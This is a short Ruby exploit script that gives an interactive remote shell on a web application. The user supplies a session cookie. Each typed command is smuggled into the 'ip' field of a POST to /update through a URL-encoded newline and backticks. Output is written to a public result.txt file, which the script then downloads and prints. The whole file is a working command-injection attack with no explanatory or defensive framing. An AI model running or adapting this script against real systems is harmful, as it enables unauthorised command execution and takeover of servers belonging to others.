require 'net/http'
require 'uri'
require 'pp'

def create_command_injection(url, cookie)
	#puts "Creating shell access...\n"
	while 1
		print "cmd> "
		cmd = STDIN.readline
		cmd.chomp!
		post = "id=1&name=webmail&ttl=600&ip=192.168.3.19%0a"
		post += "`#{URI.encode(cmd)}+>+/var/www/public/result.txt`"
		resp = Net::HTTP.start(url.host, url.port) do |http|
			http.post("/update", post, {"Cookie" => "rack.session="+cookie})
		end
		if resp.header['Location'] =~ /login/
			puts "You have been logged out"
			exit
		elsif resp.body =~ /Invalid Data Provided/
			puts "Error processing command"
		else
			resp = Net::HTTP.start(url.host, url.port) do |http|
				http.get("/result.txt", )	
			end
			puts resp.body
		end
	end
end




